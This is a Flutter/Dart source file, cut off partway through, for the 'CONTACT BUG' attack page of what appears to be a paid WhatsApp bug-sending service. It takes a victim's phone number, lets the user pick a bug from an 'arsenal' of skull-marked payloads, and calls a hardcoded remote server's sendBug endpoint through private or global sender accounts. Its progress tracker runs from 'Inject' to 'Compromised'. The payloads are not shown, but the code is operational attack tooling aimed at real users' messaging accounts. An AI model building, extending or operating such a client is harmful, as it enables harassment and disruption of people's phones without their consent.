import 'dart:convert';
import 'dart:math' as math;
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:font_awesome_flutter/font_awesome_flutter.dart';
import 'package:http/http.dart' as http;

// ── COLOR SCHEME (Dashboard Clean — same palette) ─────────────────────
class _AC {
  static const bg = Color(0xFF0c0d15);
  static const bg2 = Color(0xFF11121c);
  static const surface = Color(0xFF161823);
  static const card = Color(0xFF1a1c29);
  static const accent = Color(0xFFe8184a);
  static const accent2 = Color(0xFFff4466);
  static const accent3 = Color(0xFFff8099);
  static const gold = Color(0xFFFFD447);
  static const success = Color(0xFF25D366);
  static const text = Color(0xFFE2EAE5);
  static const muted = Color(0x73E2EAE5);
  static const muted2 = Color(0x38E2EAE5);
  static const border = Color(0x1AE8184A);
  static const border2 = Color(0x0FFFFFFF);
}

// ── ATTACK PAGE ──────────────────────────────────────────────────────
class AttackPage extends StatefulWidget {
  final String username;
  final String password;
  final String sessionKey;
  final List<Map<String, dynamic>> listBug;
  final String role;
  final String expiredDate;

  const AttackPage({
    super.key,
    required this.username,
    required this.password,
    required this.sessionKey,
    required this.listBug,
    required this.role,
    required this.expiredDate,
  });

  @override
  State<AttackPage> createState() => _AttackPageState();
}

class _AttackPageState extends State<AttackPage> with TickerProviderStateMixin {
  final targetController = TextEditingController();
  static const String baseUrl = "http://188.166.176.83:10733";

  // ── Animation Controllers ─────────────────────────────────────────
  late AnimationController _pulseController;
  late AnimationController _staggerController;
  late AnimationController _btnPress;

  // ── State ─────────────────────────────────────────────────────────
  String selectedBugId = "";
  bool _isSending = false;
  String _senderType = "private";
  int _globalSenderCount = 0;
  int _privateSenderCount = 0;
  bool _isLoadingSenders = false;
  int _activeStep = 0;
  bool _isTargetFocused = false;
  bool _hasNoSender = false;

  bool get canUseGlobalSender {
    const allowed = [
      "founder",
      "vip",
      "owner",
      "high admin",
      "moderator",
      "high owner",
      "dev",
    ];
    return allowed.contains(widget.role.toLowerCase());
  }

  @override
  void initState() {
    super.initState();
    _pulseController = AnimationController(
      vsync: this,
      duration: const Duration(seconds: 3),
    )..repeat(reverse: true);
    _staggerController = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 900),
    )..forward();
    _btnPress = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 100),
      lowerBound: 0.0,
      upperBound: 1.0,
    );

    if (widget.listBug.isNotEmpty) selectedBugId = widget.listBug[0]['bug_id'];
    if (!canUseGlobalSender) _senderType = "private";
    _fetchSenderCounts();
  }

  @override
  void dispose() {
    _pulseController.dispose();
    _staggerController.dispose();
    _btnPress.dispose();
    targetController.dispose();
    super.dispose();
  }

  // ── Stagger Animation Helper ──────────────────────────────────────
  Animation<double> _anim(int i) {
    final s = (i * 0.07).clamp(0.0, 0.55);
    final e = (s + 0.38).clamp(0.0, 1.0);
    return CurvedAnimation(
      parent: _staggerController,
      curve: Interval(s, e, curve: Curves.easeOut),
    );
  }

  // ── API ───────────────────────────────────────────────────────────
  Future<void> _fetchSenderCounts() async {
    if (!mounted) return;
    setState(() => _isLoadingSenders = true);
    try {
      final res = await http.get(
        Uri.parse("$baseUrl/api/whatsapp/mySender?key=${widget.sessionKey}"),
      );
      if (res.statusCode == 200) {
        final data = jsonDecode(res.body);
        if (data['valid'] == true && data['connections'] != null) {
          final priv = data['connections']['private'] as List?;
          final glob = data['connections']['global'] as List?;
          if (mounted) {
            setState(() {
              _privateSenderCount = priv?.length ?? 0;
              _globalSenderCount = glob?.length ?? 0;
              _hasNoSender =
                  (_privateSenderCount == 0 && _globalSenderCount == 0);
            });
          }
        }
      }
    } catch (_) {}
    if (mounted) setState(() => _isLoadingSenders = false);
  }

  String? formatPhoneNumber(String input) {
    final c = input.replaceAll(RegExp(r'[^\d]'), '');
    if (c.startsWith('0') || c.length < 8) return null;
    return c;
  }

  Future<void> _sendBug() async {
    if (_isSending) return;
    _btnPress.forward().then((_) => _btnPress.reverse());
    setState(() {
      _isSending = true;
      _activeStep = 1;
    });

    final raw = targetController.text.trim();
    final target = formatPhoneNumber(raw);
    final key = widget.sessionKey;

    if (target == null || key.isEmpty) {
      _showAlert(
        "Invalid Number",
        "Use international format (e.g., +62, 1, 44), not 08xxx.",
      );
      setState(() {
        _isSending = false;
        _activeStep = 0;
      });
      return;
    }

    try {
      final res = await http.get(
        Uri.parse(
          "$baseUrl/api/whatsapp/sendBug?key=${Uri.encodeComponent(key)}&target=${Uri.encodeComponent(target)}&bug=${Uri.encodeComponent(selectedBugId)}&senderType=$_senderType",
        ),
      );
      final data = jsonDecode(res.body);

      if (data["cooldown"] == true) {
        _showAlert("Cooldown", "Please wait a moment before sending again.");
      } else if (data["senderOn"] == false) {
        _showAlert(
          "Failed",
          "Failed to send bug. Sender empty, contact seller.",
        );
      } else if (data["valid"] == false) {
        _showAlert(
          "Failed",
          data["message"] ?? "Invalid session key or access denied.",
        );
      } else if (data["sended"] == false) {
        _showAlert(
          "Failed",
          "Failed to send bug. Server may be under maintenance.",
        );
      } else {
        setState(() => _activeStep = 2);
        _showSuccessPopup(target);
      }
    } catch (_) {
      _showAlert("Error", "Connection error. Please try again.");
    } finally {
      if (mounted) {
        setState(() {
          _isSending = false;
          if (_activeStep != 2) _activeStep = 0;
        });
      }
    }
  }

  // ── Alert (Bottom Sheet — Solid style) ─────────────────────────────
  void _showAlert(String title, String msg) {
    showModalBottomSheet(
      context: context,
      backgroundColor: Colors.transparent,
      isScrollControlled: true,
      builder: (_) => Padding(
        padding: EdgeInsets.only(
          bottom: MediaQuery.of(context).viewInsets.bottom + 16,
        ),
        child: Container(
          margin: const EdgeInsets.symmetric(horizontal: 20),
          decoration: BoxDecoration(
            color: _AC.card,
            borderRadius: BorderRadius.circular(20),
            border: Border.all(color: _AC.border, width: 1),
            boxShadow: [
              BoxShadow(
                color: Colors.black.withOpacity(0.4),
                blurRadius: 24,
                offset: const Offset(0, 12),
              ),
            ],
          ),
          child: Padding(
            padding: const EdgeInsets.all(24),
            child: Column(
              mainAxisSize: MainAxisSize.min,
              children: [
                Container(
                  width: 40,
                  height: 3,
                  decoration: BoxDecoration(
                    color: _AC.accent,
                    borderRadius: BorderRadius.circular(2),
                  ),
                ),
                const SizedBox(height: 18),
                Row(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Container(
                      width: 42,
                      height: 42,
                      decoration: BoxDecoration(
                        borderRadius: BorderRadius.circular(12),
                        color: _AC.accent.withOpacity(0.12),
                        border: Border.all(color: _AC.accent.withOpacity(0.2)),
                      ),
                      child: Center(
                        child: FaIcon(
                          FontAwesomeIcons.triangleExclamation,
                          color: _AC.accent,
                          size: 17,
                        ),
                      ),
                    ),
                    const SizedBox(width: 14),
                    Expanded(
                      child: Column(
                        crossAxisAlignment: CrossAxisAlignment.start,
                        children: [
                          const SizedBox(height: 2),
                          Text(
                            title,
                            style: const TextStyle(
                              fontFamily: 'MADEEvolveSansEVO',
                              fontSize: 15,
                              fontWeight: FontWeight.w700,
                              color: _AC.text,
                            ),
                          ),
                          const SizedBox(height: 4),
                          Container(
                            width: 28,
                            height: 2,
                            decoration: BoxDecoration(
                              color: _AC.accent.withOpacity(0.3),
                              borderRadius: BorderRadius.circular(1),
                            ),
                          ),
                        ],
                      ),
                    ),
                  ],
                ),
                const SizedBox(height: 16),
                Container(
                  width: double.infinity,
                  padding: const EdgeInsets.all(14),
                  decoration: BoxDecoration(
                    color: _AC.surface,
                    borderRadius: BorderRadius.circular(14),
                  ),
                  child: Text(
                    msg,
                    style: const TextStyle(
                      fontFamily: 'ShareTechMono',
                      fontSize: 12,
                      color: _AC.muted,
                      height: 1.6,
                    ),
                  ),
                ),
                const SizedBox(height: 20),
                Align(
                  alignment: Alignment.centerRight,
                  child: GestureDetector(
                    onTap: () => Navigator.pop(context),
                    child: Container(
                      padding: const EdgeInsets.symmetric(
                        horizontal: 28,
                        vertical: 12,
                      ),
                      decoration: BoxDecoration(
                        color: _AC.accent,
                        borderRadius: BorderRadius.circular(12),
                        boxShadow: [
                          BoxShadow(
                            color: _AC.accent.withOpacity(0.2),
                            blurRadius: 12,
                          ),
                        ],
                      ),
                      child: const Text(
                        'OK',
                        style: TextStyle(
                          fontFamily: 'MADEEvolveSansEVO',
                          fontSize: 11,
                          fontWeight: FontWeight.w700,
                          color: Colors.white,
                          letterSpacing: 2,
                        ),
                      ),
                    ),
                  ),
                ),
              ],
            ),
          ),
        ),
      ),
    );
  }

  void _showSuccessPopup(String target) {
    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (_) => _SuccessDialog(
        target: target,
        senderType: _senderType,
        onDismiss: () {
          Navigator.of(context).pop();
          setState(() => _activeStep = 0);
        },
      ),
    );
  }

  Future<void> _pasteTarget() async {
    final data = await Clipboard.getData(Clipboard.kTextPlain);
    if (data?.text != null)
      targetController.text = data!.text!.replaceAll(RegExp(r'[^\d]'), '');
  }

  // ═══════════════════════════════════════════════════════════════════
  //  BUILD
  // ═══════════════════════════════════════════════════════════════════
  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: _AC.bg,
      body: Stack(
        children: [
          // Simple gradient background
          Container(
            decoration: const BoxDecoration(
              gradient: LinearGradient(
                begin: Alignment.topCenter,
                end: Alignment.bottomCenter,
                colors: [_AC.bg, _AC.bg2, _AC.bg],
              ),
            ),
          ),
          SafeArea(
            child: Column(
              children: [
                _buildHeader(),
                Expanded(
                  child: SingleChildScrollView(
                    physics: const BouncingScrollPhysics(
                      parent: AlwaysScrollableScrollPhysics(),
                    ),
                    padding: const EdgeInsets.symmetric(horizontal: 16),
                    child: ConstrainedBox(
                      constraints: const BoxConstraints(maxWidth: 520),
                      child: Column(
                        children: [
                          const SizedBox(height: 16),
                          _buildHeroBanner(),
                          const SizedBox(height: 16),
                          _buildProfileCard(),
                          const SizedBox(height: 16),
                          if (_hasNoSender) _buildNoSenderWarning(),
                          if (_hasNoSender) const SizedBox(height: 12),
                          _buildTargetCard(),
                          const SizedBox(height: 16),
                          _buildBugArsenalCard(),
                          const SizedBox(height: 16),
                          _buildDeployCard(),
                          const SizedBox(height: 24),
                          _buildLaunchButton(),
                          const SizedBox(height: 16),
                          _buildStatusBar(),
                          const SizedBox(height: 32),
                        ],
                      ),
                    ),
                  ),
                ),
              ],
            ),
          ),
        ],
      ),
    );
  }

  // ═══════════════════════════════════════════════════════════════════
  //  HEADER — Clean dashboard style
  // ═══════════════════════════════════════════════════════════════════
  Widget _buildHeader() {
    return Container(
      height: 62,
      decoration: BoxDecoration(
        color: const Color(0xEB0c0d15),
        border: Border(bottom: BorderSide(color: _AC.border)),
      ),
      child: Row(
        children: [
          // Back button
          GestureDetector(
            onTap: () => Navigator.of(context).pop(),
            child: Container(
              width: 38,
              height: 38,
              decoration: BoxDecoration(
                color: _AC.surface,
                borderRadius: BorderRadius.circular(10),
                border: Border.all(color: _AC.border2),
              ),
              child: const Icon(Icons.arrow_back, color: _AC.text, size: 16),
            ),
          ),
          const SizedBox(width: 10),
          // Crosshairs icon
          Container(
            width: 36,
            height: 36,
            decoration: BoxDecoration(
              color: _AC.accent.withOpacity(0.12),
              borderRadius: BorderRadius.circular(10),
              border: Border.all(color: _AC.accent.withOpacity(0.25)),
            ),
            child: const Center(
              child: FaIcon(
                FontAwesomeIcons.crosshairs,
                color: _AC.accent,
                size: 14,
              ),
            ),
          ),
          const SizedBox(width: 10),
          // Title
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              mainAxisAlignment: MainAxisAlignment.center,
              children: [
                const Text(
                  "CONTACT BUG",
                  style: TextStyle(
                    color: _AC.text,
                    fontSize: 14,
                    fontWeight: FontWeight.bold,
                    fontFamily: "MADEEvolveSansEVO",
                    letterSpacing: 1.5,
                  ),
                ),
                const SizedBox(height: 1),
                Row(
                  children: [
                    Container(
                      width: 6,
                      height: 6,
                      decoration: BoxDecoration(
                        color: _AC.accent,
                        shape: BoxShape.circle,
                        boxShadow: [
                          BoxShadow(color: _AC.accent, blurRadius: 4),
                        ],
                      ),
                    ),
                    const SizedBox(width: 5),
                    Text(
                      _isSending ? "INJECTING..." : "READY",
                      style: const TextStyle(
                        color: _AC.muted,
                        fontSize: 10,
                        fontFamily: "ShareTechMono",
                      ),
                    ),
                  ],
                ),
              ],
            ),
          ),
          // Sender count badge
          Container(
            padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 6),
            decoration: BoxDecoration(
              color: _AC.accent.withOpacity(0.1),
              borderRadius: BorderRadius.circular(10),
              border: Border.all(color: _AC.accent.withOpacity(0.2)),
            ),
            child: Row(
              mainAxisSize: MainAxisSize.min,
              children: [
                const FaIcon(
                  FontAwesomeIcons.whatsapp,
                  color: _AC.success,
                  size: 12,
                ),
                const SizedBox(width: 6),
                Text(
                  "${_privateSenderCount + _globalSenderCount}",
                  style: const TextStyle(
                    color: _AC.text,
                    fontSize: 12,
                    fontWeight: FontWeight.bold,
                    fontFamily: 'ShareTechMono',
                  ),
                ),
              ],
            ),
          ),
        ],
      ),
    );
  }

  // ═══════════════════════════════════════════════════════════════════
  //  SOLID CARD HELPER — Clean dashboard style
  // ═══════════════════════════════════════════════════════════════════
  Widget _solidCard({required Widget child, int idx = -1}) {
    Widget cardChild = Container(
      width: double.infinity,
      padding: const EdgeInsets.all(20),
      decoration: BoxDecoration(
        color: _AC.card,
        borderRadius: BorderRadius.circular(16),
        border: Border.all(color: _AC.border, width: 1),
      ),
      child: child,
    );

    if (idx >= 0) {
      final a = _anim(idx);
      return FadeTransition(
        opacity: a,
        child: SlideTransition(
          position: Tween(
            begin: const Offset(0, 0.05),
            end: Offset.zero,
          ).animate(a),
          child: cardChild,
        ),
      );
    }
    return cardChild;
  }

  // ═══════════════════════════════════════════════════════════════════
  //  HERO BANNER — Contact Intrusion step tracker (solid card)
  // ═══════════════════════════════════════════════════════════════════
  Widget _buildHeroBanner() {
    return Container(
      width: double.infinity,
      padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 22),
      decoration: BoxDecoration(
        color: _AC.card,
        borderRadius: BorderRadius.circular(16),
        border: Border.all(color: _AC.border, width: 1),
      ),
      child: Column(
        children: [
          Row(
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              AnimatedBuilder(
                animation: _pulseController,
                builder: (ctx, _) {
                  final v = _pulseController.value;
                  return Container(
                    width: 40,
                    height: 40,
                    decoration: BoxDecoration(
                      shape: BoxShape.circle,
                      color: _AC.accent.withOpacity(0.12 + v * 0.04),
                      border: Border.all(
                        color: _AC.accent.withOpacity(0.3),
                        width: 1.5,
                      ),
                    ),
                    child: const Center(
                      child: FaIcon(
                        FontAwesomeIcons.crosshairs,
                        color: _AC.accent,
                        size: 16,
                      ),
                    ),
                  );
                },
              ),
              const SizedBox(width: 12),
              Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  const Text(
                    'CONTACT INTRUSION',
                    style: TextStyle(
                      fontFamily: 'MADEEvolveSansEVO',
                      fontSize: 13,
                      fontWeight: FontWeight.w700,
                      letterSpacing: 2.5,
                      color: _AC.text,
                    ),
                  ),
                  const SizedBox(height: 4),
                  Container(
                    width: 36,
                    height: 2,
                    decoration: BoxDecoration(
                      color: _AC.accent.withOpacity(0.4),
                      borderRadius: BorderRadius.circular(1),
                    ),
                  ),
                ],
              ),
            ],
          ),
          const SizedBox(height: 22),
          Row(
            children: [
              _buildHeroStep(
                0,
                FontAwesomeIcons.keyboard,
                'INPUT',
                'Enter target',
              ),
              _buildHeroStepConnector(0),
              _buildHeroStep(1, FontAwesomeIcons.bolt, 'INJECT', 'Deploy bug'),
              _buildHeroStepConnector(1),
              _buildHeroStep(
                2,
                FontAwesomeIcons.circleCheck,
                'DONE',
                'Compromised',
              ),
            ],
          ),
        ],
      ),
    );
  }

  Widget _buildHeroStep(int step, IconData icon, String title, String desc) {
    final isActive = _activeStep == step;
    final isDone = _activeStep > step;
    final color = isDone
        ? _AC.success
        : isActive
        ? _AC.accent
        : _AC.muted2;

    return Expanded(
      child: Column(
        children: [
          AnimatedBuilder(
            animation: _pulseController,
            builder: (ctx, _) {
              final p = _pulseController.value;
              return Container(
                width: 48,
                height: 48,
                decoration: BoxDecoration(
                  shape: BoxShape.circle,
                  color: color.withOpacity(isActive ? 0.12 + p * 0.06 : 0.06),
                  border: Border.all(
                    color: color.withOpacity(isActive ? 0.4 + p * 0.15 : 0.15),
                    width: isActive ? 2.0 : 1.0,
                  ),
                  boxShadow: isActive
                      ? [
                          BoxShadow(
                            color: color.withOpacity(0.1 + p * 0.08),
                            blurRadius: 12,
                          ),
                        ]
                      : null,
                ),
                child: Center(
                  child: isDone
                      ? Icon(Icons.check, color: _AC.success, size: 22)
                      : FaIcon(icon, color: color, size: 18),
                ),
              );
            },
          ),
          const SizedBox(height: 10),
          Text(
            title,
            style: TextStyle(
              fontFamily: 'MADEEvolveSansEVO',
              fontSize: 10,
              fontWeight: FontWeight.w700,
              letterSpacing: 1.5,
              color: color,
            ),
          ),
          const SizedBox(height: 4),
          Text(
            desc,
            style: const TextStyle(
              fontFamily: 'ShareTechMono',
              fontSize: 8,
              color: _AC.muted2,
            ),
            textAlign: TextAlign.center,
            maxLines: 2,
            overflow: TextOverflow.ellipsis,
          ),
        ],
      ),
    );
  }

  Widget _buildHeroStepConnector(int step) {
    final isDone = _activeStep > step;
    return Padding(
      padding: const EdgeInsets.only(top: 22),
      child: AnimatedContainer(
        duration: const Duration(milliseconds: 400),
        curve: Curves.easeOutCubic,
        width: 28,
        height: 2.5,
        decoration: BoxDecoration(
          borderRadius: BorderRadius.circular(2),
          color: isDone ? _AC.success.withOpacity(0.4) : _AC.border2,
        ),
      ),
    );
  }

  // ═══════════════════════════════════════════════════════════════════
  //  NO SENDER WARNING
  // ═══════════════════════════════════════════════════════════════════
  Widget _buildNoSenderWarning() {
    return AnimatedBuilder(
      animation: _pulseController,
      builder: (ctx, _) {
        final p = _pulseController.value;
        return Container(
          width: double.infinity,
          padding: const EdgeInsets.all(16),
          decoration: BoxDecoration(
            borderRadius: BorderRadius.circular(14),
            color: Color(0xFFFF4D6D).withOpacity(0.08 + p * 0.03),
            border: Border.all(
              color: Color(0xFFFF4D6D).withOpacity(0.25 + p * 0.1),
              width: 1,
            ),
          ),
          child: Row(
            children: [
              Container(
                width: 40,
                height: 40,
                decoration: BoxDecoration(
                  borderRadius: BorderRadius.circular(10),
                  color: Color(0xFFFF4D6D).withOpacity(0.12),
                  border: Border.all(color: Color(0xFFFF4D6D).withOpacity(0.2)),
                ),
                child: const Center(
                  child: FaIcon(
                    FontAwesomeIcons.triangleExclamation,
                    color: Color(0xFFFF4D6D),
                    size: 16,
                  ),
                ),
              ),
              const SizedBox(width: 12),
              Expanded(
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    const Text(
                      'NO SENDER DETECTED',
                      style: TextStyle(
                        fontFamily: 'MADEEvolveSansEVO',
                        fontSize: 11,
                        fontWeight: FontWeight.w700,
                        color: Color(0xFFFF4D6D),
                        letterSpacing: 1.5,
                      ),
                    ),
                    const SizedBox(height: 4),
                    const Text(
                      'Add a sender first from the Sender Manager before attacking.',
                      style: TextStyle(
                        fontFamily: 'ShareTechMono',
                        fontSize: 11,
                        color: _AC.muted,
                        height: 1.4,
                      ),
                    ),
                  ],
                ),
              ),
              // Refresh button
              GestureDetector(
                onTap: _isLoadingSenders ? null : _fetchSenderCounts,
                child: Container(
                  width: 36,
                  height: 36,
                  decoration: BoxDecoration(
                    borderRadius: BorderRadius.circular(10),
                    color: _AC.surface,
                    border: Border.all(color: _AC.border2),
                  ),
                  child: Center(
                    child: _isLoadingSenders
                        ? SizedBox(
                            width: 14,
                            height: 14,
                            child: CircularProgressIndicator(
                              strokeWidth: 2,
                              color: Color(0xFFFF4D6D).withOpacity(0.6),
                            ),
                          )
                        : const FaIcon(
                            FontAwesomeIcons.rotate,
                            color: _AC.muted2,
                            size: 13,
                          ),
                  ),
                ),
              ),
            ],
          ),
        );
      },
    );
  }

  // ═══════════════════════════════════════════════════════════════════
  //  PROFILE CARD
  // ═══════════════════════════════════════════════════════════════════
  Widget _buildProfileCard() {
    return _solidCard(
      idx: 0,
      child: Row(
        children: [
          // Avatar
          Container(
            width: 54,
            height: 54,
            decoration: BoxDecoration(
              borderRadius: BorderRadius.circular(14),
              color: _AC.accent.withOpacity(0.1),
              border: Border.all(color: _AC.accent.withOpacity(0.25)),
            ),
            child: Center(
              child: FaIcon(
                widget.role.toLowerCase() == "vip"
                    ? FontAwesomeIcons.crown
                    : FontAwesomeIcons.userSecret,
                color: _AC.accent,
                size: 22,
              ),
            ),
          ),
          const SizedBox(width: 16),
          // Info
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                const Text(
                  'Operator',
                  style: TextStyle(
                    fontSize: 10,
                    color: _AC.muted,
                    letterSpacing: 1.8,
                  ),
                ),
                const SizedBox(height: 3),
                Text(
                  widget.username,
                  style: const TextStyle(
                    fontFamily: 'MADEEvolveSansEVO',
                    fontSize: 16,
                    fontWeight: FontWeight.w700,
                    letterSpacing: 1,
                    color: _AC.text,
                  ),
                  maxLines: 1,
                  overflow: TextOverflow.ellipsis,
                ),
                const SizedBox(height: 8),
                // Role badge
                Container(
                  padding: const EdgeInsets.symmetric(
                    horizontal: 12,
                    vertical: 5,
                  ),
                  decoration: BoxDecoration(
                    borderRadius: BorderRadius.circular(8),
                    color: _AC.accent.withOpacity(0.1),
                    border: Border.all(color: _AC.accent.withOpacity(0.2)),
                  ),
                  child: Row(
                    mainAxisSize: MainAxisSize.min,
                    children: [
                      const FaIcon(
                        FontAwesomeIcons.circleCheck,
                        color: _AC.accent,
                        size: 9,
                      ),
                      const SizedBox(width: 6),
                      Text(
                        widget.role.toUpperCase(),
                        style: const TextStyle(
                          fontFamily: 'ShareTechMono',
                          fontSize: 10,
                          fontWeight: FontWeight.w700,
                          letterSpacing: 2,
                          color: _AC.accent,
                        ),
                      ),
                    ],
                  ),
                ),
              ],
            ),
          ),
          // Expiry
          Container(
            padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 10),
            decoration: BoxDecoration(
              color: _AC.surface,
              borderRadius: BorderRadius.circular(12),
              border: Border.all(color: _AC.border2),
            ),
            child: Column(
              children: [
                const FaIcon(
                  FontAwesomeIcons.calendarAlt,
                  color: _AC.gold,
                  size: 14,
                ),
                const SizedBox(height: 4),
                Text(
                  widget.expiredDate,
                  style: const TextStyle(
                    fontFamily: 'ShareTechMono',
                    fontSize: 10,
                    fontWeight: FontWeight.w700,
                    color: _AC.gold,
                  ),
                ),
                const SizedBox(height: 2),
                const Text(
                  'EXPIRY',
                  style: TextStyle(
                    fontFamily: 'ShareTechMono',
                    fontSize: 8,
                    color: _AC.muted2,
                    letterSpacing: 1.5,
                  ),
                ),
              ],
            ),
          ),
        ],
      ),
    );
  }

  // ═══════════════════════════════════════════════════════════════════
  //  TARGET CARD (Solid dashboard style)
  // ═══════════════════════════════════════════════════════════════════
  Widget _buildTargetCard() {
    return _solidCard(
      idx: 1,
      child: Column(
        children: [
          _buildSectionHeader(FontAwesomeIcons.crosshairs, 'TARGET'),
          const SizedBox(height: 16),
          AnimatedContainer(
            duration: const Duration(milliseconds: 250),
            curve: Curves.easeOutCubic,
            decoration: BoxDecoration(
              color: _AC.surface,
              borderRadius: BorderRadius.circular(14),
              border: Border.all(
                color: _isTargetFocused ? _AC.accent : _AC.border,
                width: _isTargetFocused ? 1.5 : 1.0,
              ),
            ),
            child: Focus(
              onFocusChange: (f) => setState(() => _isTargetFocused = f),
              child: Row(
                children: [
                  Padding(
                    padding: const EdgeInsets.fromLTRB(16, 16, 0, 16),
                    child: Container(
                      width: 40,
                      height: 40,
                      decoration: BoxDecoration(
                        borderRadius: BorderRadius.circular(10),
                        color: _AC.accent.withOpacity(
                          _isTargetFocused ? 0.12 : 0.06,
                        ),
                        border: Border.all(color: _AC.accent.withOpacity(0.15)),
                      ),
                      child: const Center(
                        child: FaIcon(
                          FontAwesomeIcons.globe,
                          color: _AC.accent,
                          size: 17,
                        ),
                      ),
                    ),
                  ),
                  Expanded(
                    child: TextField(
                      controller: targetController,
                      keyboardType: TextInputType.phone,
                      style: const TextStyle(
                        fontFamily: 'ShareTechMono',
                        fontSize: 16,
                        color: _AC.text,
                        letterSpacing: 0.5,
                      ),
                      cursorColor: _AC.accent,
                      cursorWidth: 2,
                      decoration: InputDecoration(
                        border: InputBorder.none,
                        hintText: '628123456789',
                        hintStyle: const TextStyle(
                          fontFamily: 'ShareTechMono',
                          fontSize: 14,
                          color: _AC.muted2,
                        ),
                        contentPadding: const EdgeInsets.symmetric(
                          horizontal: 12,
                          vertical: 16,
                        ),
                      ),
                      onSubmitted: (_) => _sendBug(),
                    ),
                  ),
                  GestureDetector(
                    onTap: _pasteTarget,
                    child: Container(
                      margin: const EdgeInsets.all(12),
                      width: 38,
                      height: 38,
                      decoration: BoxDecoration(
                        borderRadius: BorderRadius.circular(10),
                        color: _AC.surface,
                        border: Border.all(color: _AC.border2),
                      ),
                      child: const Center(
                        child: FaIcon(
                          FontAwesomeIcons.paste,
                          color: _AC.muted2,
                          size: 14,
                        ),
                      ),
                    ),
                  ),
                ],
              ),
            ),
          ),
          const SizedBox(height: 10),
          Padding(
            padding: const EdgeInsets.symmetric(horizontal: 4),
            child: Row(
              mainAxisAlignment: MainAxisAlignment.spaceBetween,
              children: [
                Row(
                  children: [
                    const FaIcon(
                      FontAwesomeIcons.circleInfo,
                      color: _AC.muted2,
                      size: 10,
                    ),
                    const SizedBox(width: 6),
                    const Text(
                      'International format without +',
                      style: TextStyle(
                        fontFamily: 'ShareTechMono',
                        fontSize: 11,
                        color: _AC.muted2,
                      ),
                    ),
                  ],
                ),
                Container(
                  padding: const EdgeInsets.symmetric(
                    horizontal: 10,
                    vertical: 4,
                  ),
                  decoration: BoxDecoration(
                    color: _AC.surface,
                    borderRadius: BorderRadius.circular(8),
                    border: Border.all(color: _AC.border),
                  ),
                  child: const Text(
                    '62xxx',
                    style: TextStyle(
                      fontFamily: 'ShareTechMono',
                      fontSize: 10,
                      color: _AC.accent,
                    ),
                  ),
                ),
              ],
            ),
          ),
        ],
      ),
    );
  }

  // ═══════════════════════════════════════════════════════════════════
  //  BUG ARSENAL CARD (Horizontal scroll selector — preserved)
  // ═══════════════════════════════════════════════════════════════════
  Widget _buildBugArsenalCard() {
    return _solidCard(
      idx: 2,
      child: Column(
        children: [
          _buildSectionHeader(
            FontAwesomeIcons.bug,
            'ARSENAL',
            tag: '${widget.listBug.length}',
          ),
          const SizedBox(height: 14),
          SizedBox(
            height: 158,
            child: widget.listBug.isEmpty
                ? Container(
                    width: double.infinity,
                    decoration: BoxDecoration(
                      color: _AC.surface,
                      borderRadius: BorderRadius.circular(12),
                      border: Border.all(color: _AC.border2),
                    ),
                    child: Column(
                      mainAxisAlignment: MainAxisAlignment.center,
                      children: [
                        const FaIcon(
                          FontAwesomeIcons.bug,
                          color: _AC.muted2,
                          size: 28,
                        ),
                        const SizedBox(height: 10),
                        const Text(
                          'No bugs available',
                          style: TextStyle(
                            fontFamily: 'ShareTechMono',
                            fontSize: 12,
                            color: _AC.muted2,
                          ),
                        ),
                      ],
                    ),
                  )
                : ListView.builder(
                    scrollDirection: Axis.horizontal,
                    physics: const BouncingScrollPhysics(),
                    padding: const EdgeInsets.symmetric(horizontal: 4),
                    itemCount: widget.listBug.length,
                    itemBuilder: (ctx, i) {
                      final bug = widget.listBug[i];
                      final sel = selectedBugId == bug['bug_id'];
                      return GestureDetector(
                        onTap: () =>
                            setState(() => selectedBugId = bug['bug_id']),
                        child: AnimatedContainer(
                          duration: const Duration(milliseconds: 250),
                          curve: Curves.easeOutCubic,
                          width: 164,
                          margin: const EdgeInsets.only(right: 14),
                          decoration: BoxDecoration(
                            borderRadius: BorderRadius.circular(16),
                            color: sel
                                ? _AC.accent.withOpacity(0.08)
                                : _AC.surface,
                            border: Border.all(
                              color: sel ? _AC.accent : _AC.border,
                              width: sel ? 1.5 : 1.0,
                            ),
                          ),
                          child: Stack(
                            children: [
                              Padding(
                                padding: const EdgeInsets.all(18),
                                child: Column(
                                  crossAxisAlignment: CrossAxisAlignment.start,
                                  children: [
                                    Container(
                                      width: 44,
                                      height: 44,
                                      decoration: BoxDecoration(
                                        borderRadius: BorderRadius.circular(14),
                                        color: sel
                                            ? _AC.accent.withOpacity(0.15)
                                            : _AC.accent.withOpacity(0.06),
                                        border: Border.all(
                                          color: sel
                                              ? _AC.accent.withOpacity(0.25)
                                              : _AC.accent.withOpacity(0.1),
                                        ),
                                      ),
                                      child: Center(
                                        child: FaIcon(
                                          FontAwesomeIcons.skull,
                                          color: _AC.accent,
                                          size: 20,
                                        ),
                                      ),
                                    ),
                                    const Spacer(),
                                    Text(
                                      (bug['bug_name'] ?? '')
                                          .toString()
                                          .toUpperCase(),
                                      style: const TextStyle(
                                        fontFamily: 'MADEEvolveSansEVO',
                                        fontSize: 11,
                                        fontWeight: FontWeight.w700,
                                        color: _AC.text,
                                        letterSpacing: 0.5,
                                      ),
                                      maxLines: 1,
                                      overflow: TextOverflow.ellipsis,
                                    ),
                                    const SizedBox(height: 5),
                                    Row(
                                      children: [
                                        Container(
                                          width: 5,
                                          height: 5,
                                          decoration: BoxDecoration(
                                            shape: BoxShape.circle,
                                            color: sel
                                                ? _AC.accent
                                                : _AC.muted2,
                                          ),
                                        ),
                                        const SizedBox(width: 5),
                                        Text(
                                          'READY',
                                          style: TextStyle(
                                            fontFamily: 'ShareTechMono',
                                            fontSize: 9,
                                            fontWeight: FontWeight.w700,
                                            color: sel
                                                ? _AC.accent
                                                : _AC.muted2,
                                          ),
                                        ),
                                      ],
                                    ),
